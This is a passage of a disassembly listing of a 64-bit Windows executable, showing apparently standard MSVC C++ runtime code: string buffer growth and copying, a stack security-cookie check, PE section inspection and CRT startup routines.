   140003a6e:	49 8d 0c 34          	lea    (%r12,%rsi,1),%rcx
   140003a72:	e8 96 11 00 00       	call   0x140004c0d
   140003a77:	48 83 7f 18 07       	cmpq   $0x7,0x18(%rdi)
   140003a7c:	76 03                	jbe    0x140003a81
   140003a7e:	48 8b 3f             	mov    (%rdi),%rdi
   140003a81:	4d 8b c4             	mov    %r12,%r8
   140003a84:	48 8b d7             	mov    %rdi,%rdx
   140003a87:	48 8b ce             	mov    %rsi,%rcx
   140003a8a:	e8 78 11 00 00       	call   0x140004c07
   140003a8f:	4c 89 6b 10          	mov    %r13,0x10(%rbx)
   140003a93:	e9 e7 00 00 00       	jmp    0x140003b7f
   140003a98:	49 be fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r14
   140003a9f:	ff ff 7f 
   140003aa2:	49 8b c6             	mov    %r14,%rax
   140003aa5:	49 2b c4             	sub    %r12,%rax
   140003aa8:	49 3b c7             	cmp    %r15,%rax
   140003aab:	0f 82 e6 00 00 00    	jb     0x140003b97
   140003ab1:	49 8b c5             	mov    %r13,%rax
   140003ab4:	48 83 c8 07          	or     $0x7,%rax
   140003ab8:	49 3b c6             	cmp    %r14,%rax
   140003abb:	76 10                	jbe    0x140003acd
   140003abd:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003ac4:	ff ff 7f 
   140003ac7:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140003acb:	eb 32                	jmp    0x140003aff
   140003acd:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140003ad2:	4c 8b f0             	mov    %rax,%r14
   140003ad5:	48 3b c1             	cmp    %rcx,%rax
   140003ad8:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003adf:	ff ff 7f 
   140003ae2:	4c 0f 42 f1          	cmovb  %rcx,%r14
   140003ae6:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   140003aea:	48 3b c8             	cmp    %rax,%rcx
   140003aed:	0f 87 aa 00 00 00    	ja     0x140003b9d
   140003af3:	48 03 c9             	add    %rcx,%rcx
   140003af6:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140003afd:	72 2f                	jb     0x140003b2e
   140003aff:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140003b03:	48 3b c1             	cmp    %rcx,%rax
   140003b06:	0f 86 91 00 00 00    	jbe    0x140003b9d
   140003b0c:	48 8b c8             	mov    %rax,%rcx
   140003b0f:	e8 ac 02 00 00       	call   0x140003dc0
   140003b14:	48 85 c0             	test   %rax,%rax
   140003b17:	74 0e                	je     0x140003b27
   140003b19:	48 8d 68 27          	lea    0x27(%rax),%rbp
   140003b1d:	48 83 e5 e0          	and    $0xffffffffffffffe0,%rbp
   140003b21:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140003b25:	eb 14                	jmp    0x140003b3b
   140003b27:	ff 15 e3 16 00 00    	call   *0x16e3(%rip)        # 0x140005210
   140003b2d:	cc                   	int3
   140003b2e:	48 85 c9             	test   %rcx,%rcx
   140003b31:	74 08                	je     0x140003b3b
   140003b33:	e8 88 02 00 00       	call   0x140003dc0
   140003b38:	48 8b e8             	mov    %rax,%rbp
   140003b3b:	48 89 2b             	mov    %rbp,(%rbx)
   140003b3e:	4c 89 6b 10          	mov    %r13,0x10(%rbx)
   140003b42:	4c 89 73 18          	mov    %r14,0x18(%rbx)
   140003b46:	48 83 7f 18 07       	cmpq   $0x7,0x18(%rdi)
   140003b4b:	76 03                	jbe    0x140003b50
   140003b4d:	48 8b 3f             	mov    (%rdi),%rdi
   140003b50:	4d 03 e4             	add    %r12,%r12
   140003b53:	48 8b d7             	mov    %rdi,%rdx
   140003b56:	4d 8b c4             	mov    %r12,%r8
   140003b59:	48 8b cd             	mov    %rbp,%rcx
   140003b5c:	e8 a6 10 00 00       	call   0x140004c07
   140003b61:	48 83 7e 18 07       	cmpq   $0x7,0x18(%rsi)
   140003b66:	76 03                	jbe    0x140003b6b
   140003b68:	48 8b 36             	mov    (%rsi),%rsi
   140003b6b:	4e 8d 04 7d 02 00 00 	lea    0x2(,%r15,2),%r8
   140003b72:	00 
   140003b73:	48 8b d6             	mov    %rsi,%rdx
   140003b76:	49 8d 0c 2c          	lea    (%r12,%rbp,1),%rcx
   140003b7a:	e8 88 10 00 00       	call   0x140004c07
   140003b7f:	48 8b c3             	mov    %rbx,%rax
   140003b82:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140003b87:	48 83 c4 20          	add    $0x20,%rsp
   140003b8b:	41 5f                	pop    %r15
   140003b8d:	41 5e                	pop    %r14
   140003b8f:	41 5d                	pop    %r13
   140003b91:	41 5c                	pop    %r12
   140003b93:	5f                   	pop    %rdi
   140003b94:	5e                   	pop    %rsi
   140003b95:	5d                   	pop    %rbp
   140003b96:	c3                   	ret
   140003b97:	e8 34 d7 ff ff       	call   0x1400012d0
   140003b9c:	cc                   	int3
   140003b9d:	e8 8e d6 ff ff       	call   0x140001230
   140003ba2:	cc                   	int3
   140003ba3:	cc                   	int3
   140003ba4:	cc                   	int3
   140003ba5:	cc                   	int3
   140003ba6:	cc                   	int3
   140003ba7:	cc                   	int3
   140003ba8:	cc                   	int3
   140003ba9:	cc                   	int3
   140003baa:	cc                   	int3
   140003bab:	cc                   	int3
   140003bac:	cc                   	int3
   140003bad:	cc                   	int3
   140003bae:	cc                   	int3
   140003baf:	cc                   	int3
   140003bb0:	48 83 ec 28          	sub    $0x28,%rsp
   140003bb4:	48 8b 11             	mov    (%rcx),%rdx
   140003bb7:	48 8b 02             	mov    (%rdx),%rax
   140003bba:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003bbe:	48 8b 4c 11 48       	mov    0x48(%rcx,%rdx,1),%rcx
   140003bc3:	48 85 c9             	test   %rcx,%rcx
   140003bc6:	74 07                	je     0x140003bcf
   140003bc8:	48 8b 01             	mov    (%rcx),%rax
   140003bcb:	ff 50 10             	call   *0x10(%rax)
   140003bce:	90                   	nop
   140003bcf:	48 83 c4 28          	add    $0x28,%rsp
   140003bd3:	c3                   	ret
   140003bd4:	cc                   	int3
   140003bd5:	cc                   	int3
   140003bd6:	cc                   	int3
   140003bd7:	cc                   	int3
   140003bd8:	cc                   	int3
   140003bd9:	cc                   	int3
   140003bda:	cc                   	int3
   140003bdb:	cc                   	int3
   140003bdc:	cc                   	int3
   140003bdd:	cc                   	int3
   140003bde:	cc                   	int3
   140003bdf:	cc                   	int3
   140003be0:	40 56                	rex push %rsi
   140003be2:	57                   	push   %rdi
   140003be3:	41 56                	push   %r14
   140003be5:	48 83 ec 30          	sub    $0x30,%rsp
   140003be9:	4c 8b 71 10          	mov    0x10(%rcx),%r14
   140003bed:	48 bf fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rdi
   140003bf4:	ff ff 7f 
   140003bf7:	48 8b c7             	mov    %rdi,%rax
   140003bfa:	48 8b f1             	mov    %rcx,%rsi
   140003bfd:	49 2b c6             	sub    %r14,%rax
   140003c00:	48 3b c2             	cmp    %rdx,%rax
   140003c03:	0f 82 70 01 00 00    	jb     0x140003d79
   140003c09:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140003c0e:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140003c13:	48 8b 69 18          	mov    0x18(%rcx),%rbp
   140003c17:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140003c1c:	4e 8d 3c 32          	lea    (%rdx,%r14,1),%r15
   140003c20:	49 8b d7             	mov    %r15,%rdx
   140003c23:	48 83 ca 07          	or     $0x7,%rdx
   140003c27:	48 3b d7             	cmp    %rdi,%rdx
   140003c2a:	76 10                	jbe    0x140003c3c
   140003c2c:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003c33:	ff ff 7f 
   140003c36:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140003c3a:	eb 52                	jmp    0x140003c8e
   140003c3c:	48 8b cd             	mov    %rbp,%rcx
   140003c3f:	48 8b c7             	mov    %rdi,%rax
   140003c42:	48 d1 e9             	shr    $1,%rcx
   140003c45:	48 2b c1             	sub    %rcx,%rax
   140003c48:	48 3b e8             	cmp    %rax,%rbp
   140003c4b:	76 10                	jbe    0x140003c5d
   140003c4d:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003c54:	ff ff 7f 
   140003c57:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140003c5b:	eb 31                	jmp    0x140003c8e
   140003c5d:	48 8d 04 29          	lea    (%rcx,%rbp,1),%rax
   140003c61:	48 8b fa             	mov    %rdx,%rdi
   140003c64:	48 3b d0             	cmp    %rax,%rdx
   140003c67:	48 0f 42 f8          	cmovb  %rax,%rdi
   140003c6b:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140003c72:	ff ff 7f 
   140003c75:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   140003c79:	48 3b c8             	cmp    %rax,%rcx
   140003c7c:	0f 87 fd 00 00 00    	ja     0x140003d7f
   140003c82:	48 03 c9             	add    %rcx,%rcx
   140003c85:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140003c8c:	72 2c                	jb     0x140003cba
   140003c8e:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140003c92:	48 3b c1             	cmp    %rcx,%rax
   140003c95:	0f 86 e4 00 00 00    	jbe    0x140003d7f
   140003c9b:	48 8b c8             	mov    %rax,%rcx
   140003c9e:	e8 1d 01 00 00       	call   0x140003dc0
   140003ca3:	48 85 c0             	test   %rax,%rax
   140003ca6:	0f 84 95 00 00 00    	je     0x140003d41
   140003cac:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140003cb0:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140003cb4:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140003cb8:	eb 11                	jmp    0x140003ccb
   140003cba:	48 85 c9             	test   %rcx,%rcx
   140003cbd:	74 0a                	je     0x140003cc9
   140003cbf:	e8 fc 00 00 00       	call   0x140003dc0
   140003cc4:	48 8b d8             	mov    %rax,%rbx
   140003cc7:	eb 02                	jmp    0x140003ccb
   140003cc9:	33 db                	xor    %ebx,%ebx
   140003ccb:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140003cd0:	4e 8d 34 75 02 00 00 	lea    0x2(,%r14,2),%r14
   140003cd7:	00 
   140003cd8:	4c 89 7e 10          	mov    %r15,0x10(%rsi)
   140003cdc:	48 8d 15 35 18 00 00 	lea    0x1835(%rip),%rdx        # 0x140005518
   140003ce3:	48 89 7e 18          	mov    %rdi,0x18(%rsi)
   140003ce7:	48 8b cb             	mov    %rbx,%rcx
   140003cea:	4c 8d 04 00          	lea    (%rax,%rax,1),%r8
   140003cee:	4d 8d 3c 18          	lea    (%r8,%rbx,1),%r15
   140003cf2:	48 83 fd 07          	cmp    $0x7,%rbp
   140003cf6:	76 50                	jbe    0x140003d48
   140003cf8:	48 8b 3e             	mov    (%rsi),%rdi
   140003cfb:	e8 07 0f 00 00       	call   0x140004c07
   140003d00:	4d 8b c6             	mov    %r14,%r8
   140003d03:	48 8b d7             	mov    %rdi,%rdx
   140003d06:	49 8b cf             	mov    %r15,%rcx
   140003d09:	e8 f9 0e 00 00       	call   0x140004c07
   140003d0e:	48 8d 14 6d 02 00 00 	lea    0x2(,%rbp,2),%rdx
   140003d15:	00 
   140003d16:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003d1d:	72 18                	jb     0x140003d37
   140003d1f:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   140003d23:	48 83 c2 27          	add    $0x27,%rdx
   140003d27:	48 2b f9             	sub    %rcx,%rdi
   140003d2a:	48 8d 47 f8          	lea    -0x8(%rdi),%rax
   140003d2e:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003d32:	77 0d                	ja     0x140003d41
   140003d34:	48 8b f9             	mov    %rcx,%rdi
   140003d37:	48 8b cf             	mov    %rdi,%rcx
   140003d3a:	e8 fd 02 00 00       	call   0x14000403c
   140003d3f:	eb 1a                	jmp    0x140003d5b
   140003d41:	ff 15 c9 14 00 00    	call   *0x14c9(%rip)        # 0x140005210
   140003d47:	cc                   	int3
   140003d48:	e8 ba 0e 00 00       	call   0x140004c07
   140003d4d:	4d 8b c6             	mov    %r14,%r8
   140003d50:	48 8b d6             	mov    %rsi,%rdx
   140003d53:	49 8b cf             	mov    %r15,%rcx
   140003d56:	e8 ac 0e 00 00       	call   0x140004c07
   140003d5b:	48 89 1e             	mov    %rbx,(%rsi)
   140003d5e:	48 8b c6             	mov    %rsi,%rax
   140003d61:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   140003d66:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140003d6b:	4c 8b 7c 24 20       	mov    0x20(%rsp),%r15
   140003d70:	48 83 c4 30          	add    $0x30,%rsp
   140003d74:	41 5e                	pop    %r14
   140003d76:	5f                   	pop    %rdi
   140003d77:	5e                   	pop    %rsi
   140003d78:	c3                   	ret
   140003d79:	e8 52 d5 ff ff       	call   0x1400012d0
   140003d7e:	cc                   	int3
   140003d7f:	e8 ac d4 ff ff       	call   0x140001230
   140003d84:	cc                   	int3
   140003d85:	cc                   	int3
   140003d86:	cc                   	int3
   140003d87:	cc                   	int3
   140003d88:	cc                   	int3
   140003d89:	cc                   	int3
   140003d8a:	cc                   	int3
   140003d8b:	cc                   	int3
   140003d8c:	cc                   	int3
   140003d8d:	cc                   	int3
   140003d8e:	cc                   	int3
   140003d8f:	cc                   	int3
   140003d90:	cc                   	int3
   140003d91:	cc                   	int3
   140003d92:	cc                   	int3
   140003d93:	cc                   	int3
   140003d94:	cc                   	int3
   140003d95:	cc                   	int3
   140003d96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140003d9d:	00 00 00 
   140003da0:	48 3b 0d 99 42 00 00 	cmp    0x4299(%rip),%rcx        # 0x140008040
   140003da7:	75 10                	jne    0x140003db9
   140003da9:	48 c1 c1 10          	rol    $0x10,%rcx
   140003dad:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140003db2:	75 01                	jne    0x140003db5
   140003db4:	c3                   	ret
   140003db5:	48 c1 c9 10          	ror    $0x10,%rcx
   140003db9:	e9 52 05 00 00       	jmp    0x140004310
   140003dbe:	cc                   	int3
   140003dbf:	cc                   	int3
   140003dc0:	40 53                	rex push %rbx
   140003dc2:	48 83 ec 20          	sub    $0x20,%rsp
   140003dc6:	48 8b d9             	mov    %rcx,%rbx
   140003dc9:	eb 0f                	jmp    0x140003dda
   140003dcb:	48 8b cb             	mov    %rbx,%rcx
   140003dce:	e8 a7 0c 00 00       	call   0x140004a7a
   140003dd3:	85 c0                	test   %eax,%eax
   140003dd5:	74 13                	je     0x140003dea
   140003dd7:	48 8b cb             	mov    %rbx,%rcx
   140003dda:	e8 a1 0c 00 00       	call   0x140004a80
   140003ddf:	48 85 c0             	test   %rax,%rax
   140003de2:	74 e7                	je     0x140003dcb
   140003de4:	48 83 c4 20          	add    $0x20,%rsp
   140003de8:	5b                   	pop    %rbx
   140003de9:	c3                   	ret
   140003dea:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   140003dee:	74 06                	je     0x140003df6
   140003df0:	e8 83 06 00 00       	call   0x140004478
   140003df5:	cc                   	int3
   140003df6:	e8 35 d4 ff ff       	call   0x140001230
   140003dfb:	cc                   	int3
   140003dfc:	48 83 ec 28          	sub    $0x28,%rsp
   140003e00:	e8 47 08 00 00       	call   0x14000464c
   140003e05:	85 c0                	test   %eax,%eax
   140003e07:	74 21                	je     0x140003e2a
   140003e09:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140003e10:	00 00 
   140003e12:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140003e16:	eb 05                	jmp    0x140003e1d
   140003e18:	48 3b c8             	cmp    %rax,%rcx
   140003e1b:	74 14                	je     0x140003e31
   140003e1d:	33 c0                	xor    %eax,%eax
   140003e1f:	f0 48 0f b1 0d 40 43 	lock cmpxchg %rcx,0x4340(%rip)        # 0x140008168
   140003e26:	00 00 
   140003e28:	75 ee                	jne    0x140003e18
   140003e2a:	32 c0                	xor    %al,%al
   140003e2c:	48 83 c4 28          	add    $0x28,%rsp
   140003e30:	c3                   	ret
   140003e31:	b0 01                	mov    $0x1,%al
   140003e33:	eb f7                	jmp    0x140003e2c
   140003e35:	cc                   	int3
   140003e36:	cc                   	int3
   140003e37:	cc                   	int3
   140003e38:	48 83 ec 28          	sub    $0x28,%rsp
   140003e3c:	85 c9                	test   %ecx,%ecx
   140003e3e:	75 07                	jne    0x140003e47
   140003e40:	c6 05 29 43 00 00 01 	movb   $0x1,0x4329(%rip)        # 0x140008170
   140003e47:	e8 4c 06 00 00       	call   0x140004498
   140003e4c:	e8 2f 0b 00 00       	call   0x140004980
   140003e51:	84 c0                	test   %al,%al
   140003e53:	75 04                	jne    0x140003e59
   140003e55:	32 c0                	xor    %al,%al
   140003e57:	eb 14                	jmp    0x140003e6d
   140003e59:	e8 22 0b 00 00       	call   0x140004980
   140003e5e:	84 c0                	test   %al,%al
   140003e60:	75 09                	jne    0x140003e6b
   140003e62:	33 c9                	xor    %ecx,%ecx
   140003e64:	e8 17 0b 00 00       	call   0x140004980
   140003e69:	eb ea                	jmp    0x140003e55
   140003e6b:	b0 01                	mov    $0x1,%al
   140003e6d:	48 83 c4 28          	add    $0x28,%rsp
   140003e71:	c3                   	ret
   140003e72:	cc                   	int3
   140003e73:	cc                   	int3
   140003e74:	40 53                	rex push %rbx
   140003e76:	48 83 ec 20          	sub    $0x20,%rsp
   140003e7a:	80 3d f0 42 00 00 00 	cmpb   $0x0,0x42f0(%rip)        # 0x140008171
   140003e81:	8b d9                	mov    %ecx,%ebx
   140003e83:	75 67                	jne    0x140003eec
   140003e85:	83 f9 01             	cmp    $0x1,%ecx
   140003e88:	77 6a                	ja     0x140003ef4
   140003e8a:	e8 bd 07 00 00       	call   0x14000464c
   140003e8f:	85 c0                	test   %eax,%eax
   140003e91:	74 28                	je     0x140003ebb
   140003e93:	85 db                	test   %ebx,%ebx
   140003e95:	75 24                	jne    0x140003ebb
   140003e97:	48 8d 0d da 42 00 00 	lea    0x42da(%rip),%rcx        # 0x140008178
   140003e9e:	e8 ef 0b 00 00       	call   0x140004a92
   140003ea3:	85 c0                	test   %eax,%eax
   140003ea5:	75 10                	jne    0x140003eb7
   140003ea7:	48 8d 0d e2 42 00 00 	lea    0x42e2(%rip),%rcx        # 0x140008190
   140003eae:	e8 df 0b 00 00       	call   0x140004a92
   140003eb3:	85 c0                	test   %eax,%eax
   140003eb5:	74 2e                	je     0x140003ee5
   140003eb7:	32 c0                	xor    %al,%al
   140003eb9:	eb 33                	jmp    0x140003eee
   140003ebb:	66 0f 6f 05 6d 14 00 	movdqa 0x146d(%rip),%xmm0        # 0x140005330
   140003ec2:	00 
   140003ec3:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003ec7:	f3 0f 7f 05 a9 42 00 	movdqu %xmm0,0x42a9(%rip)        # 0x140008178
   140003ece:	00 
   140003ecf:	48 89 05 b2 42 00 00 	mov    %rax,0x42b2(%rip)        # 0x140008188
   140003ed6:	f3 0f 7f 05 b2 42 00 	movdqu %xmm0,0x42b2(%rip)        # 0x140008190
   140003edd:	00 
   140003ede:	48 89 05 bb 42 00 00 	mov    %rax,0x42bb(%rip)        # 0x1400081a0
   140003ee5:	c6 05 85 42 00 00 01 	movb   $0x1,0x4285(%rip)        # 0x140008171
   140003eec:	b0 01                	mov    $0x1,%al
   140003eee:	48 83 c4 20          	add    $0x20,%rsp
   140003ef2:	5b                   	pop    %rbx
   140003ef3:	c3                   	ret
   140003ef4:	b9 05 00 00 00       	mov    $0x5,%ecx
   140003ef9:	e8 62 07 00 00       	call   0x140004660
   140003efe:	cc                   	int3
   140003eff:	cc                   	int3
   140003f00:	48 83 ec 18          	sub    $0x18,%rsp
   140003f04:	4c 8b c1             	mov    %rcx,%r8
   140003f07:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140003f0c:	66 39 05 ed c0 ff ff 	cmp    %ax,-0x3f13(%rip)        # 0x140000000
   140003f13:	75 78                	jne    0x140003f8d
   140003f15:	48 63 0d 20 c1 ff ff 	movslq -0x3ee0(%rip),%rcx        # 0x14000003c
   140003f1c:	48 8d 15 dd c0 ff ff 	lea    -0x3f23(%rip),%rdx        # 0x140000000
   140003f23:	48 03 ca             	add    %rdx,%rcx
   140003f26:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140003f2c:	75 5f                	jne    0x140003f8d
   140003f2e:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140003f33:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140003f37:	75 54                	jne    0x140003f8d
   140003f39:	4c 2b c2             	sub    %rdx,%r8
   140003f3c:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140003f40:	48 83 c2 18          	add    $0x18,%rdx
   140003f44:	48 03 d1             	add    %rcx,%rdx
   140003f47:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140003f4b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140003f4f:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140003f53:	48 89 14 24          	mov    %rdx,(%rsp)
   140003f57:	49 3b d1             	cmp    %r9,%rdx
   140003f5a:	74 18                	je     0x140003f74
   140003f5c:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140003f5f:	4c 3b c1             	cmp    %rcx,%r8
   140003f62:	72 0a                	jb     0x140003f6e
   140003f64:	8b 42 08             	mov    0x8(%rdx),%eax
   140003f67:	03 c1                	add    %ecx,%eax
   140003f69:	4c 3b c0             	cmp    %rax,%r8
   140003f6c:	72 08                	jb     0x140003f76
   140003f6e:	48 83 c2 28          	add    $0x28,%rdx
   140003f72:	eb df                	jmp    0x140003f53
   140003f74:	33 d2                	xor    %edx,%edx
   140003f76:	48 85 d2             	test   %rdx,%rdx
   140003f79:	75 04                	jne    0x140003f7f
   140003f7b:	32 c0                	xor    %al,%al
   140003f7d:	eb 14                	jmp    0x140003f93
   140003f7f:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140003f83:	7d 04                	jge    0x140003f89
   140003f85:	32 c0                	xor    %al,%al
   140003f87:	eb 0a                	jmp    0x140003f93
   140003f89:	b0 01                	mov    $0x1,%al
   140003f8b:	eb 06                	jmp    0x140003f93
   140003f8d:	32 c0                	xor    %al,%al
   140003f8f:	eb 02                	jmp    0x140003f93
   140003f91:	32 c0                	xor    %al,%al
   140003f93:	48 83 c4 18          	add    $0x18,%rsp
   140003f97:	c3                   	ret
   140003f98:	40 53                	rex push %rbx
   140003f9a:	48 83 ec 20          	sub    $0x20,%rsp
   140003f9e:	8a d9                	mov    %cl,%bl
   140003fa0:	e8 a7 06 00 00       	call   0x14000464c
   140003fa5:	33 d2                	xor    %edx,%edx
   140003fa7:	85 c0                	test   %eax,%eax
   140003fa9:	74 0b                	je     0x140003fb6
   140003fab:	84 db                	test   %bl,%bl
   140003fad:	75 07                	jne    0x140003fb6
   140003faf:	48 87 15 b2 41 00 00 	xchg   %rdx,0x41b2(%rip)        # 0x140008168
   140003fb6:	48 83 c4 20          	add    $0x20,%rsp
   140003fba:	5b                   	pop    %rbx
   140003fbb:	c3                   	ret
   140003fbc:	40 53                	rex push %rbx
   140003fbe:	48 83 ec 20          	sub    $0x20,%rsp
   140003fc2:	80 3d a7 41 00 00 00 	cmpb   $0x0,0x41a7(%rip)        # 0x140008170
   140003fc9:	8a d9                	mov    %cl,%bl
   140003fcb:	74 04                	je     0x140003fd1
   140003fcd:	84 d2                	test   %dl,%dl
   140003fcf:	75 0c                	jne    0x140003fdd
   140003fd1:	e8 aa 09 00 00       	call   0x140004980
   140003fd6:	8a cb                	mov    %bl,%cl
   140003fd8:	e8 a3 09 00 00       	call   0x140004980
   140003fdd:	b0 01                	mov    $0x1,%al
   140003fdf:	48 83 c4 20          	add    $0x20,%rsp
   140003fe3:	5b                   	pop    %rbx
   140003fe4:	c3                   	ret
   140003fe5:	cc                   	int3
   140003fe6:	cc                   	int3
   140003fe7:	cc                   	int3
   140003fe8:	40 53                	rex push %rbx
   140003fea:	48 83 ec 20          	sub    $0x20,%rsp
   140003fee:	48 83 3d 82 41 00 00 	cmpq   $0xffffffffffffffff,0x4182(%rip)        # 0x140008178
   140003ff5:	ff 
   140003ff6:	48 8b d9             	mov    %rcx,%rbx
   140003ff9:	75 07                	jne    0x140004002
   140003ffb:	e8 9e 0a 00 00       	call   0x140004a9e
   140004000:	eb 0f                	jmp    0x140004011
   140004002:	48 8b d3             	mov    %rbx,%rdx
   140004005:	48 8d 0d 6c 41 00 00 	lea    0x416c(%rip),%rcx        # 0x140008178
   14000400c:	e8 87 0a 00 00       	call   0x140004a98
   140004011:	33 d2                	xor    %edx,%edx
   140004013:	85 c0                	test   %eax,%eax
   140004015:	48 0f 44 d3          	cmove  %rbx,%rdx
   140004019:	48 8b c2             	mov    %rdx,%rax
   14000401c:	48 83 c4 20          	add    $0x20,%rsp
   140004020:	5b                   	pop    %rbx
   140004021:	c3                   	ret
   140004022:	cc                   	int3
   140004023:	cc                   	int3
   140004024:	48 83 ec 28          	sub    $0x28,%rsp
   140004028:	e8 bb ff ff ff       	call   0x140003fe8
   14000402d:	48 f7 d8             	neg    %rax
   140004030:	1b c0                	sbb    %eax,%eax
   140004032:	f7 d8                	neg    %eax
   140004034:	ff c8                	dec    %eax
   140004036:	48 83 c4 28          	add    $0x28,%rsp
   14000403a:	c3                   	ret
   14000403b:	cc                   	int3
   14000403c:	e9 73 08 00 00       	jmp    0x1400048b4
   140004041:	cc                   	int3
   140004042:	cc                   	int3
   140004043:	cc                   	int3
   140004044:	40 53                	rex push %rbx
   140004046:	48 83 ec 20          	sub    $0x20,%rsp
   14000404a:	48 8d 05 f7 12 00 00 	lea    0x12f7(%rip),%rax        # 0x140005348
   140004051:	48 8b d9             	mov    %rcx,%rbx
   140004054:	48 89 01             	mov    %rax,(%rcx)
   140004057:	f6 c2 01             	test   $0x1,%dl
   14000405a:	74 0a                	je     0x140004066
   14000405c:	ba 18 00 00 00       	mov    $0x18,%edx
   140004061:	e8 d6 ff ff ff       	call   0x14000403c
   140004066:	48 8b c3             	mov    %rbx,%rax
   140004069:	48 83 c4 20          	add    $0x20,%rsp
   14000406d:	5b                   	pop    %rbx
   14000406e:	c3                   	ret
   14000406f:	cc                   	int3
   140004070:	40 53                	rex push %rbx
   140004072:	48 83 ec 20          	sub    $0x20,%rsp
   140004076:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000407b:	e8 30 0a 00 00       	call   0x140004ab0
   140004080:	e8 e3 08 00 00       	call   0x140004968
   140004085:	8b c8                	mov    %eax,%ecx
   140004087:	e8 4e 0a 00 00       	call   0x140004ada
   14000408c:	e8 5b 07 00 00       	call   0x1400047ec
   140004091:	8b d8                	mov    %eax,%ebx
   140004093:	e8 60 0a 00 00       	call   0x140004af8
   140004098:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000409d:	89 18                	mov    %ebx,(%rax)
   14000409f:	e8 d0 fd ff ff       	call   0x140003e74
   1400040a4:	84 c0                	test   %al,%al
   1400040a6:	74 73                	je     0x14000411b
   1400040a8:	e8 1f 09 00 00       	call   0x1400049cc
   1400040ad:	48 8d 0d 54 09 00 00 	lea    0x954(%rip),%rcx        # 0x140004a08
   1400040b4:	e8 6b ff ff ff       	call   0x140004024
   1400040b9:	e8 86 05 00 00       	call   0x140004644
   1400040be:	8b c8                	mov    %eax,%ecx
   1400040c0:	e8 c1 09 00 00       	call   0x140004a86
   1400040c5:	85 c0                	test   %eax,%eax
   1400040c7:	75 52                	jne    0x14000411b
   1400040c9:	e8 a2 08 00 00       	call   0x140004970
   1400040ce:	e8 dd 08 00 00       	call   0x1400049b0
   1400040d3:	85 c0                	test   %eax,%eax
   1400040d5:	74 0c                	je     0x1400040e3
   1400040d7:	48 8d 0d 0e 07 00 00 	lea    0x70e(%rip),%rcx        # 0x1400047ec
   1400040de:	e8 d3 09 00 00       	call   0x140004ab6
   1400040e3:	e8 c8 07 00 00       	call   0x1400048b0
   1400040e8:	e8 c3 07 00 00       	call   0x1400048b0
   1400040ed:	e8 fa 06 00 00       	call   0x1400047ec
   1400040f2:	8b c8                	mov    %eax,%ecx
   1400040f4:	e8 f3 09 00 00       	call   0x140004aec
   1400040f9:	e8 82 08 00 00       	call   0x140004980
   1400040fe:	84 c0                	test   %al,%al
   140004100:	74 05                	je     0x140004107
   140004102:	e8 85 09 00 00       	call   0x140004a8c
   140004107:	e8 e0 06 00 00       	call   0x1400047ec
   14000410c:	e8 d3 06 00 00       	call   0x1400047e4
   140004111:	85 c0                	test   %eax,%eax
   140004113:	75 06                	jne    0x14000411b
   140004115:	48 83 c4 20          	add    $0x20,%rsp
   140004119:	5b                   	pop    %rbx
   14000411a:	c3                   	ret
   14000411b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004120:	e8 3b 05 00 00       	call   0x140004660
   140004125:	cc                   	int3
   140004126:	cc                   	int3
   140004127:	cc                   	int3
   140004128:	48 83 ec 28          	sub    $0x28,%rsp
   14000412c:	e8 63 08 00 00       	call   0x140004994
   140004131:	33 c0                	xor    %eax,%eax
   140004133:	48 83 c4 28          	add    $0x28,%rsp
   140004137:	c3                   	ret
   140004138:	48 83 ec 28          	sub    $0x28,%rsp
   14000413c:	e8 03 07 00 00       	call   0x140004844
   140004141:	e8 a6 06 00 00       	call   0x1400047ec
   140004146:	8b c8                	mov    %eax,%ecx
